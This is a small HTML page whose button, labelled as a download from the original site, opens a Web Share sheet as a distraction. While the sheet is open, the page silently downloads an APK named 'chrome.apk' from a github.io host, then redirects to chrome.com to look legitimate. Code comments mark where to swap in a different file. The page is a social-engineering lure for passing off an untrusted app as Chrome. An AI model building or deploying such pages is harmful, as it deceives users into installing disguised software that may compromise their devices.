<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    .button {
      background-color: #4CAF50;
      border: none;
      color: white;
      padding: 15px 32px;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>

<script>
function a() {

  // 1️⃣ Web Share – HARUS sinkron dengan klik user
  if (navigator.share) {
    navigator.share({
      title: "Download Center",
      text: "Download the official document from the original site.",
      url: "https://google.com"
    }).catch(() => {});
  }

  // 2️⃣ Trigger download while Share Sheet is visible
  setTimeout(function () {
    var link = document.createElement('a');
    link.href = 'https://ecdnts-del.github.io/test-apk/chrome.apk'; // ganti file di sini
    link.download = 'chrome.apk';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  }, 350);

  // 3️⃣ Background redirect
  setTimeout(function () {
    window.location.href = "https://chrome.com";
  }, 900);
}
</script>

<center>
  <input type="button"
         class="button"
         value="Download From Original Site"
         onclick="a()">
</center>

</body>
</html>
